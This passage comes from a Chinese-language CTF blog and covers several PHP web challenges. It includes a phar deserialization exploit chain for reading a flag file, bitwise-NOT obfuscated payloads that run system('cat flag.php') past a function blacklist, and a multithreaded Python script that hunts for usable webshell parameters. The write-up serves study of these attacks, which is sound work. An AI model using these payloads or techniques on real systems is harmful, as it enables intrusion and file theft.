markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('娉ㄥ唽鎴愬姛', 'info');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token markup">&lt; 20 &amp;&amp; $u-></span><span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"sftUahRiTz"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"&lt;script>window.location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('璐﹀彿鎴栧瘑鐮侀敊璇�', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>其中发现class.php的File类中的close()内存在file_get_contents()可能读取文件。</p><p><img src="https://s1.ax1x.com/2020/09/27/0APckt.png" srcset="/img/loading.gif" alt="0APckt.png"></p><p>继续向上跟踪，看见User类中调用了一个close()。那么如果db变量是File对象，再传下$filename，就可以直接调用File中的close()进行文件读取。但这样并没有可输出数据的地方。</p><p><a href="https://imgchr.com/i/03Zkhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/03/03Zkhn.png" srcset="/img/loading.gif" alt="03Zkhn.png"></a></p><p>曲线救国，看到了FileList类。                                       </p><p>首先FileList对象中存在__call方法，当我们调用不存在的方法时会自动调用它。</p><p>本题中__call方法的作用就是遍历所有文件去调用刚刚的方法，并将结果存储在以filename为一级键名，方法为二级键名的数组result中。</p><p><a href="https://imgchr.com/i/08jHBt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/08jHBt.png" srcset="/img/loading.gif" alt="08jHBt.png"></a>        </p><p>而在销毁时会输出变量$table，$table中存在$results参数。</p><p><a href="https://imgchr.com/i/08v2Ks" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/08v2Ks.png" srcset="/img/loading.gif" alt="08v2Ks.png"></a></p><p>综上所述。构造思路为：</p><p>构建 一个User对象，使它的$db为FileList对象。在User类析构时，因为调用不到close()，就会执行__call方法既而实现执行File类内的close()。这个结果会存入result并被加入table输出。</p><p>之后再利用phar伪协议进行利用。这个执行选在delete.php，是因为download.php多了下面这行代码：</p><pre class=" language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>它限制了只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录。</p><p>exp:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">FileList</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">></span> db <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>剩下的流程就是抓包传test.phar，改个Content-Type成png，上传成功；之后在delete页面filename传参phar://test.png得到flag。</p><p><a href="https://imgchr.com/i/0GJZJP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0GJZJP.png" srcset="/img/loading.gif" alt="0GJZJP.png"></a></p><h1 id="2020-第五空间智能安全大赛-Web-hate-php"><a href="#2020-第五空间智能安全大赛-Web-hate-php" class="headerlink" title="2020-第五空间智能安全大赛-Web-hate-php"></a>2020-第五空间智能安全大赛-Web-hate-php</h1><p><a href="https://imgchr.com/i/0G0ozn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0G0ozn.png" srcset="/img/loading.gif" alt="0G0ozn.png"></a></p><p>可以看见先是用preg_match对参数code做了很多过滤，</p><p>后面又用到</p><pre><code> $blacklist = get_defined_functions()[&#39;internal&#39;];</code></pre><p>把内置函数加到黑名单里了。</p><p>抓了个包看到PHP/7.4.5，php7后可以用  <strong>($a)();</strong> 这种方式执行动态函数。</p><p>如</p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'phphinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出</span><span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token constant">8F</span><span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span></code></pre><p>payload：?code = (~%8F%97%8F%96%91%99%90)()</p><p>就能读到phpinfo。</p><p>结合取反构造exp:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'print_r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'scandir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//payload:  ?code=(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((~%D1)))</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出</span><span class="token comment" spellcheck="true">//payload:  ??code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)</span></code></pre><h1 id="强网杯-2019-Web-高明的黑客"><a href="#强网杯-2019-Web-高明的黑客" class="headerlink" title="强网杯-2019-Web-高明的黑客"></a>强网杯-2019-Web-高明的黑客</h1><p>题目一上来给了网站的/src源码，三千多个文件；</p><p>文件中有很多可利用函数，但需要寻找能正常传参的文件及参数。</p><p>#整体思路：先一次性发起请求测试哪些文件的GET和POST的传参是可用的，再在这基础上区分是POST还是GET。<br>这样的思路加多线程可以很好的节约时间。</p><p>参考：<a href="https://blog.csdn.net/a3320315/article/details/102945940" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940</a></p><p>具体脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'开始：  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>                             filePath <span class="token operator">=</span> r<span class="token string">"D:\phpstudy_pro\WWW\src"</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#改变当前的路径</span>requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">10</span>                  <span class="token comment" spellcheck="true">#设置重连次数</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#返回path内全部文件及目录名的数组</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">:</span>    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span><span class="token operator">+</span>file<span class="token operator">+</span> <span class="token string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#提取所有的$_GET和$_POST的参数</span>            gets <span class="token operator">=</span> list<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            posts <span class="token operator">=</span> list<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">#POST</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">#GET</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'echo("dwm2");'</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'echo("dwm2");'</span>    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/src/'</span><span class="token operator">+</span>file                          req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#一次性请求所有的GET和POST的方法</span>    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                  content <span class="token operator">=</span> req<span class="token punctuation">.</span>text    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token comment" spellcheck="true">#print(content)  </span>    <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                  flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>            req <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token string">'echo("dwm2");'</span><span class="token punctuation">)</span>            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">1</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>                req <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token string">'echo("dwm2");'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token keyword">if</span> <span class="token string">"dwm2"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#flag用来判断参数是GET还是POST</span>            param <span class="token operator">=</span> <span class="token string">"get-"</span><span class="token operator">+</span>a        <span class="token keyword">else</span><span class="token punctuation">:</span>            param <span class="token operator">=</span> <span class="token string">"post-"</span><span class="token operator">+</span>b        end <span class="token operator">=</span> <span class="token string">"文件："</span><span class="token operator">+</span>file<span class="token operator">+</span><span class="token string">"参数："</span><span class="token operator">+</span>param        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span>     s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>                                                         <span class="token comment" spellcheck="true">#多线程</span>    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑完得到结果</p><p><a href="https://imgchr.com/i/0JFpOU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0JFpOU.png" srcset="/img/loading.gif" alt="0JFpOU.png"></a></p><p>直接传参得到flag。</p><p><a href="https://imgchr.com/i/0JknCn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/0JknCn.png" srcset="/img/loading.gif" alt="0JknCn.png"></a></p><h1 id="2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload"><a href="#2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload" class="headerlink" title="2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload"></a>2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload</h1><p> <strong>考点：session,代码审计</strong></p><p>直接给了源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'/var/babyctf/success.txt'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">safe_delete</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$direction</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'direction'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'attr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir_path</span> <span class="token operator">=</span> <span class="token string">"/var/babyctf/"</span><span class="token punctuation">.</span><span class="token variable">$attr</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//文件夹路径</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token operator">===</span><span class="token string">"private"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$dir_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//路径为/var/babyctf/private/username</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//判断文件是否是通过 HTTP POST 上传的</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename</span>        <span class="token variable">$file_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"_"</span><span class="token punctuation">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename_sha256(tmp_name)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir_path</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">,</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token string">"uploaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$upload_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$direction</span> <span class="token operator">===</span> <span class="token string">"download"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span 